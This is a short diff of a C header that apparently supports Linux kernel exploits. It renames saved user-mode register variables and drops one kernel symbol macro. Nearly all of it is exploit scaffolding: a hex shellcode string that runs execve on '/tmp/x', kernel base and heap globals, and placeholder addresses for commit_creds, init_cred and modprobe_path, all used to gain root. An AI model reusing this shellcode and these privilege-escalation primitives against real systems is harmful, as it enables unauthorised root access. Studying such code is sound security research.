@@ -22,7 +22,7 @@
 // 21 bytes, non null bytes
 #define EXEC_TMPX \
     "\x6a\x3b\x58\x99\x68\x6d\x70\x2f\x78\x66\x68\x2f\x74\x54\x5f\x52\x57\x54\x5e\x0f\x05"
-extern u64 user_cs, user_ss, user_rsp, user_rflags;
+extern u64 user_cs, user_ss, user_sp, user_flags;
 extern u64 kbase;
 extern u64 kheap;
 
@@ -36,7 +36,6 @@ extern u64 kheap;
 #define PAGE_OFFSET_BASE_UPPER_BOUND (0xfffffe0000000000ull)
 
 // addresses
-#define addr_prepare_kernel_cred (DUMMY_VALUE + kbase_offset)
 #define addr_init_cred (DUMMY_VALUE + kbase_offset)
 #define addr_commit_creds (DUMMY_VALUE + kbase_offset)
 #define addr_modprobe_path (DUMMY_VALUE + kbase_offset)
